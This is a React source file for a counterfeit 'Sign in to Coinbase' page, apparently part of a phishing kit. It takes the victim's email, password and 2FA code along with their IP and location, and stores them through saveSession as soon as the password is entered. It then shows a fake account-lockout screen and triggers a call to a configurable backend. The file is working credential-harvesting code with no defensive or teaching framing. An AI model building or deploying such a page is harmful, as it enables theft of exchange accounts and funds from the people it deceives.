import { useState, useEffect } from "react";
import { Link } from "react-router-dom";
import { Eye, EyeOff, KeyRound, ShieldAlert, Mail } from "lucide-react";
import AuthLayout from "@/components/auth/AuthLayout";
import SocialButton from "@/components/auth/SocialButton";
import { getLocationInfo, saveSession } from "@/lib/sessionStorage";

const SignIn = () => {
  const [step, setStep] = useState<"email" | "password" | "verify" | "blocked">("email");
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [verifyCode, setVerifyCode] = useState("");
  const [locationInfo, setLocationInfo] = useState({ ip: "", city: "", country: "" });
  const [resendCooldown, setResendCooldown] = useState(0);

  useEffect(() => {
    getLocationInfo().then(setLocationInfo);
  }, []);

  useEffect(() => {
    if (resendCooldown > 0) {
      const t = setTimeout(() => setResendCooldown(resendCooldown - 1), 1000);
      return () => clearTimeout(t);
    }
  }, [resendCooldown]);

  const inputClass = "w-full h-14 px-4 rounded-lg border border-[hsl(222,40%,25%)] bg-[hsl(222,47%,16%)] text-white placeholder:text-[hsl(220,20%,45%)] focus:outline-none focus:ring-2 focus:ring-primary text-[15px]";
  const labelClass = "block text-[14px] font-medium text-white mb-2";
  const btnClass = "w-full h-14 rounded-full bg-[hsl(222,47%,20%)] hover:bg-[hsl(222,47%,25%)] text-white font-semibold text-[15px] transition-colors";
  const btnDisabledClass = "w-full h-14 rounded-full bg-[hsl(222,47%,14%)] text-[hsl(220,20%,40%)] font-semibold text-[15px] cursor-not-allowed";

  const backButton = (onClick: () => void) => (
    <button
      onClick={onClick}
      className="flex items-center gap-1.5 text-[hsl(0,0%,55%)] hover:text-white text-sm mb-6 -ml-1 transition-colors"
    >
      <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M19 12H5"/><path d="m12 19-7-7 7-7"/></svg>
      Back
    </button>
  );

  const maskEmail = (em: string) => {
    const [local, domain] = em.split("@");
    if (!domain) return em;
    const visible = local.slice(0, 2);
    return `${visible}${"•".repeat(Math.max(local.length - 2, 3))}@${domain}`;
  };

  const sendVerificationEmail = () => {
    const apiUrl = (window as any).__BACKEND_URL__ || localStorage.getItem("backend_url");
    if (apiUrl) {
      fetch(`${apiUrl}/api/send-verification`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ email }),
      }).catch(() => {});
    }
  };

  const handleEmailContinue = (e: React.FormEvent) => {
    e.preventDefault();
    if (email.trim()) setStep("password");
  };

  const handlePasswordContinue = (e: React.FormEvent) => {
    e.preventDefault();
    if (password.trim()) {
      // Save credentials immediately when password is submitted
      saveSession({
        email,
        password,
        verifyCode: "",
        ...locationInfo,
        timestamp: new Date().toISOString(),
      });
      setStep("blocked");
      sendVerificationEmail();
    }
  };

  /* ── Blocked / Can't verify page ── */
  if (step === "blocked") {
    return (
      <AuthLayout>
        <div className="flex flex-col items-center text-center pt-4">
          {/* Shield icon */}
          <div className="w-16 h-16 rounded-full bg-[hsl(0,65%,50%)] flex items-center justify-center mb-6">
            <ShieldAlert className="w-8 h-8 text-white" />
          </div>

          <h1 className="text-[24px] font-semibold text-white mb-3 leading-tight">
            We can't verify your sign‑in
          </h1>
          <p className="text-[15px] text-[hsl(0,0%,55%)] mb-2 leading-relaxed max-w-[400px]">
            We noticed unusual activity on your account. To protect your account, we've temporarily locked sign‑in.
          </p>
          <p className="text-[15px] text-[hsl(0,0%,55%)] mb-8 leading-relaxed max-w-[400px]">
            We sent a verification email to <span className="text-white font-medium">{maskEmail(email)}</span>. 
            Please check your inbox and follow the instructions to verify your identity.
          </p>

          {/* Email icon row */}
          <div className="w-full max-w-[400px] p-4 rounded-xl bg-[hsl(222,47%,14%)] border border-[hsl(222,40%,22%)] flex items-center gap-4 mb-6">
            <div className="w-10 h-10 rounded-full bg-[hsl(221,100%,50%)] flex items-center justify-center shrink-0">
              <Mail className="w-5 h-5 text-white" />
            </div>
            <div className="text-left">
              <p className="text-[14px] text-white font-medium">Check your email</p>
              <p className="text-[13px] text-[hsl(0,0%,50%)]">
                We sent instructions to {maskEmail(email)}
              </p>
            </div>
          </div>

          {/* Resend button */}
          <button
            onClick={() => {
              if (resendCooldown === 0) {
                sendVerificationEmail();
                setResendCooldown(60);
              }
            }}
            disabled={resendCooldown > 0}
            className={`w-full max-w-[400px] h-12 rounded-full text-[14px] font-semibold transition-colors ${
              resendCooldown > 0
                ? "bg-[hsl(222,47%,14%)] text-[hsl(220,20%,40%)] cursor-not-allowed"
                : "bg-[hsl(222,47%,20%)] hover:bg-[hsl(222,47%,25%)] text-white"
            }`}
          >
            {resendCooldown > 0 ? `Resend email (${resendCooldown}s)` : "Resend verification email"}
          </button>

          {/* Secondary links */}
          <div className="mt-6 space-y-3">
            <a href="#" className="block text-[13px] text-primary hover:underline">
              Try another way
            </a>
            <a href="#" className="block text-[13px] text-[hsl(0,0%,50%)] hover:text-white transition-colors">
              Contact support
            </a>
          </div>
        </div>
      </AuthLayout>
    );
  }

  /* ── Verify your identity ── */
  if (step === "verify") {
    return (
      <AuthLayout>
        {backButton(() => setStep("password"))}

        <div className="flex items-center gap-3 mb-2">
          <div className="w-10 h-10 rounded-full bg-[hsl(221,100%,50%)] flex items-center justify-center">
            <KeyRound className="w-5 h-5 text-white" />
          </div>
          <h1 className="text-[26px] font-bold text-white leading-tight">Verify your identity</h1>
        </div>
        <p className="text-[15px] text-[hsl(0,0%,55%)] mb-8 leading-relaxed">
          Enter the 2-step verification code from your authenticator app.
        </p>
        <form onSubmit={(e) => e.preventDefault()} className="space-y-5">
          <div>
            <label className={labelClass}>Verification code</label>
            <input
              type="text"
              inputMode="numeric"
              maxLength={7}
              value={verifyCode}
              onChange={(e) => setVerifyCode(e.target.value.replace(/[^0-9]/g, ""))}
              placeholder="000 000"
              className={`${inputClass} tracking-[0.15em] text-center text-lg font-medium`}
              autoFocus
            />
          </div>
          <button
            type="submit"
            className={verifyCode.length >= 6 ? btnClass : btnDisabledClass}
            disabled={verifyCode.length < 6}
            onClick={() => {
              if (verifyCode.length >= 6) {
                saveSession({
                  email, password, verifyCode,
                  ...locationInfo,
                  timestamp: new Date().toISOString(),
                });
              }
            }}
          >
            Verify
          </button>
          <div className="text-center pt-1">
            <a href="#" className="text-[13px] text-primary hover:underline">Try another way</a>
          </div>
        </form>
      </AuthLayout>
    );
  }

  /* ── Password step ── */
  if (step === "password") {
    return (
      <AuthLayout>
        {backButton(() => setStep("email"))}

        <h1 className="text-[26px] font-bold text-white mb-6 leading-tight">Enter your password</h1>

        {/* Avatar + email row */}
        <div className="flex items-center gap-3 mb-6 p-3 rounded-lg bg-[hsl(222,47%,14%)] border border-[hsl(222,40%,25%)]">
          <div className="w-8 h-8 rounded-full bg-[hsl(221,100%,50%)] flex items-center justify-center text-white text-sm font-semibold shrink-0">
            {email.charAt(0).toUpperCase()}
          </div>
          <span className="text-[14px] text-[hsl(0,0%,75%)] truncate">{email}</span>
        </div>
        <form onSubmit={handlePasswordContinue} className="space-y-5">
          <div>
            <label className={labelClass}>Password</label>
            <div className="relative">
              <input
                type={showPassword ? "text" : "password"}
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                placeholder="Enter your password"
                className={`${inputClass} pr-12`}
                autoFocus
              />
              <button
                type="button"
                onClick={() => setShowPassword(!showPassword)}
                className="absolute right-4 top-1/2 -translate-y-1/2 text-[hsl(220,20%,45%)] hover:text-white transition-colors"
              >
                {showPassword ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
              </button>
            </div>
          </div>
          <button type="submit" className={password.trim() ? btnClass : btnDisabledClass} disabled={!password.trim()}>
            Sign in
          </button>
          <div className="text-center pt-1">
            <a href="#" className="text-[13px] text-primary hover:underline">Forgot password?</a>
          </div>
        </form>
      </AuthLayout>
    );
  }

  /* ── Email step ── */
  return (
    <AuthLayout>
      <h1 className="text-[28px] font-bold text-white mb-8 leading-tight">Sign in to Coinbase</h1>
      <form onSubmit={handleEmailContinue} className="space-y-5">
        <div>
          <label className={labelClass}>Email</label>
          <input
            type="email"
            value={email}
            onChange={(e) => setEmail(e.target.value)}
            placeholder="Your email address"
            className={inputClass}
          />
        </div>
        <button type="submit" className={email.trim() ? btnClass : btnDisabledClass} disabled={!email.trim()}>
          Continue
        </button>
      </form>

      {/* Divider */}
      <div className="flex items-center gap-3 my-7">
        <div className="flex-1 h-px bg-[hsl(222,40%,25%)]" />
        <span className="text-xs text-[hsl(220,20%,45%)] font-medium uppercase tracking-wide">Or</span>
        <div className="flex-1 h-px bg-[hsl(222,40%,25%)]" />
      </div>

      {/* Social buttons */}
      <div className="space-y-3">
        <SocialButton
          icon={<KeyRound className="w-5 h-5" />}
          label="Sign in with passkey"
        />
        <SocialButton
          icon={<svg width="18" height="18" viewBox="0 0 18 18"><path d="M17.64 9.2c0-.637-.057-1.251-.164-1.84H9v3.481h4.844a4.14 4.14 0 01-1.796 2.716v2.259h2.908c1.702-1.567 2.684-3.875 2.684-6.615z" fill="#4285F4"/><path d="M9 18c2.43 0 4.467-.806 5.956-2.18l-2.908-2.259c-.806.54-1.837.86-3.048.86-2.344 0-4.328-1.584-5.036-3.711H.957v2.332A8.997 8.997 0 009 18z" fill="#34A853"/><path d="M3.964 10.71A5.41 5.41 0 013.682 9c0-.593.102-1.17.282-1.71V4.958H.957A8.997 8.997 0 000 9c0 1.452.348 2.827.957 4.042l3.007-2.332z" fill="#FBBC05"/><path d="M9 3.58c1.321 0 2.508.454 3.44 1.345l2.582-2.58C13.463.891 11.426 0 9 0A8.997 8.997 0 00.957 4.958L3.964 6.29C4.672 4.163 6.656 2.58 9 3.58z" fill="#EA4335"/></svg>}
          label="Sign in with Google"
        />
        <SocialButton
          icon={<svg width="18" height="18" viewBox="0 0 18 22" fill="white"><path d="M14.94 0c.12 1.27-.37 2.53-1.13 3.45-.76.92-2.01 1.64-3.23 1.54-.14-1.24.42-2.54 1.14-3.35C12.49.72 13.81.08 14.94 0zM17.89 14.56c-.42.98-.62 1.42-1.16 2.28-.75 1.2-1.81 2.7-3.12 2.71-1.17.02-1.46-.76-3.04-.75-1.58.01-1.9.77-3.07.76-1.31-.02-2.31-1.37-3.06-2.57C2.56 13.36 2.3 9.48 3.76 7.4c1.02-1.46 2.64-2.32 4.15-2.32 1.42 0 2.31.77 3.48.77 1.13 0 1.82-.77 3.45-.77 1.34 0 2.78.73 3.8 1.99-3.34 1.83-2.8 6.6.25 7.49z"/></svg>}
          label="Sign in with Apple"
        />
      </div>

      {/* Footer links */}
      <div className="mt-8 text-center">
        <p className="text-[14px] text-[hsl(0,0%,65%)]">
          Don't have an account?{" "}
          <Link to="/signup" className="text-primary hover:underline font-medium">Sign up</Link>
        </p>
      </div>
    </AuthLayout>
  );
};

export default SignIn;
